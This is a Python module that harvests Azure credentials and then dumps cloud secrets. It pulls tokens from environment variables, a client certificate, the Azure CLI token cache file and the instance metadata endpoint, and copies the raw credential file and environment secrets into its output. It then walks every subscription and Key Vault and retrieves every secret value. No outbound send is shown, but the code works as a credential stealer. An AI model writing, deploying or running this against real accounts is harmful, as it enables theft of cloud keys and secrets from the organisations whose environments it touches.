import json
import os
import time
import urllib.request
import urllib.parse
import base64

from utilities.crypto import rsa_sign_sha256, cert_sha1_thumbprint

_AAD_BASE = "https://login.microsoftonline.com"
_ARM_RESOURCE = "https://management.azure.com/"
_VAULT_RESOURCE = "https://vault.azure.net"
_ARM_BASE = "https://management.azure.com"


def _http_post(url, data: dict, timeout=10):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body)
    return urllib.request.urlopen(req, timeout=timeout).read().decode()


def _http_get_json(url, token, timeout=10):
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())


def _http_get(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {})
    return urllib.request.urlopen(req, timeout=timeout).read().decode()


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _token_client_credentials(tenant_id, client_id, client_secret, resource):
    resp = _http_post(f"{_AAD_BASE}/{tenant_id}/oauth2/token", {
        "grant_type": "client_credentials",
        "client_id": client_id,
        "client_secret": client_secret,
        "resource": resource,
    })
    return json.loads(resp)["access_token"]


def _token_client_certificate(tenant_id, client_id, cert_path, resource):
    with open(cert_path, 'rb') as f:
        pem_data = f.read()

    thumbprint = _b64url(cert_sha1_thumbprint(pem_data))
    now = int(time.time())
    header = _b64url(json.dumps({"alg": "RS256", "typ": "JWT", "x5t": thumbprint}).encode())
    payload = _b64url(json.dumps({
        "aud": f"{_AAD_BASE}/{tenant_id}/oauth2/token",
        "iss": client_id,
        "sub": client_id,
        "jti": _b64url(os.urandom(16)),
        "nbf": now,
        "exp": now + 600,
    }).encode())

    signing_input = f"{header}.{payload}".encode()
    signature = rsa_sign_sha256(pem_data, signing_input)
    jwt = f"{header}.{payload}.{_b64url(signature)}"

    resp = _http_post(f"{_AAD_BASE}/{tenant_id}/oauth2/token", {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "client_id": client_id,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": jwt,
        "resource": resource,
    })
    return json.loads(resp)["access_token"]


def _read_file(path):
    try:
        with open(path, 'r', errors='replace') as f:
            return f.read()
    except Exception:
        return None


def _token_from_cli_cache(resource):
    cache_file = os.path.expanduser('~/.azure/accessTokens.json')
    if not os.path.exists(cache_file):
        return None
    try:
        with open(cache_file) as f:
            tokens = json.load(f)
        for entry in tokens:
            if resource in entry.get('resource', ''):
                token = entry.get('accessToken')
                if token:
                    return token
    except Exception:
        pass
    return None


def _token_from_imds(resource):
    url = (
        "http://169.254.169.254/metadata/identity/oauth2/token"
        f"?api-version=2018-02-01&resource={urllib.parse.quote(resource)}"
    )
    resp = _http_get(url, headers={"Metadata": "true"}, timeout=2)
    return json.loads(resp)["access_token"]


def _collect_env_vars():
    keys = [
        "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
        "AZURE_CLIENT_CERTIFICATE_PATH", "AZURE_SUBSCRIPTION_ID",
    ]
    return {k: v for k in keys if (v := os.environ.get(k))}


def resolve_tokens():
    client_id = os.environ.get('AZURE_CLIENT_ID')
    client_secret = os.environ.get('AZURE_CLIENT_SECRET')
    tenant_id = os.environ.get('AZURE_TENANT_ID')
    cert_path = os.environ.get('AZURE_CLIENT_CERTIFICATE_PATH')

    if client_id and tenant_id and client_secret:
        try:
            return (
                _token_client_credentials(tenant_id, client_id, client_secret, _ARM_RESOURCE),
                _token_client_credentials(tenant_id, client_id, client_secret, _VAULT_RESOURCE),
                None, "env", None
            )
        except Exception as e:
            return None, None, f"Client credentials flow failed: {e}", None, None

    if client_id and tenant_id and cert_path:
        try:
            return (
                _token_client_certificate(tenant_id, client_id, cert_path, _ARM_RESOURCE),
                _token_client_certificate(tenant_id, client_id, cert_path, _VAULT_RESOURCE),
                None, "env_cert", cert_path
            )
        except Exception as e:
            return None, None, f"Certificate auth flow failed: {e}", None, None

    cli_cache = os.path.expanduser('~/.azure/accessTokens.json')
    arm_token = _token_from_cli_cache(_ARM_RESOURCE)
    vault_token = _token_from_cli_cache(_VAULT_RESOURCE) or _token_from_cli_cache("https://vault.azure.net/")
    if arm_token and vault_token:
        return arm_token, vault_token, None, "cli_cache", cli_cache

    try:
        return _token_from_imds(_ARM_RESOURCE), _token_from_imds(_VAULT_RESOURCE), None, "imds", None
    except Exception:
        pass

    return None, None, "No Azure credentials found", None, None


def _list_subscriptions(arm_token):
    resp = _http_get_json(f"{_ARM_BASE}/subscriptions?api-version=2020-01-01", arm_token)
    return [s["subscriptionId"] for s in resp.get("value", [])]


def _list_vaults(arm_token, subscription_id):
    url = f"{_ARM_BASE}/subscriptions/{subscription_id}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"
    vaults = []
    while url:
        resp = _http_get_json(url, arm_token)
        vaults.extend(resp.get("value", []))
        url = resp.get("nextLink")
    return vaults


def _list_secret_names(vault_url, vault_token):
    url = f"{vault_url}/secrets?api-version=7.4"
    names = []
    while url:
        resp = _http_get_json(url, vault_token)
        for item in resp.get("value", []):
            names.append(item["id"].split("/secrets/")[-1])
        url = resp.get("nextLink")
    return names


def _get_secret_value(vault_url, secret_name, vault_token):
    resp = _http_get_json(f"{vault_url}/secrets/{secret_name}?api-version=7.4", vault_token)
    return resp.get("value")


def collect() -> dict:
    arm_token, vault_token, err, source, source_file = resolve_tokens()
    if err:
        return {"error": err}

    credential_sources = {"source": source, "env": _collect_env_vars()}
    if source_file:
        credential_sources["credential_file"] = _read_file(source_file)

    result = {"credential_sources": credential_sources, "vaults": {}}

    try:
        subscriptions = _list_subscriptions(arm_token)
    except Exception as e:
        return {"error": f"Failed to list subscriptions: {e}"}

    for sub_id in subscriptions:
        try:
            vaults = _list_vaults(arm_token, sub_id)
        except Exception:
            continue

        for vault in vaults:
            vault_name = vault["name"]
            vault_url = vault["properties"]["vaultUri"].rstrip("/")
            vault_secrets = {}

            try:
                secret_names = _list_secret_names(vault_url, vault_token)
            except Exception:
                result["vaults"][vault_name] = {"__error__": "failed to list secrets"}
                continue

            for name in secret_names:
                try:
                    vault_secrets[name] = _get_secret_value(vault_url, name, vault_token)
                except Exception:
                    vault_secrets[name] = {"__error__": "failed to retrieve"}

            result["vaults"][vault_name] = vault_secrets

    return result
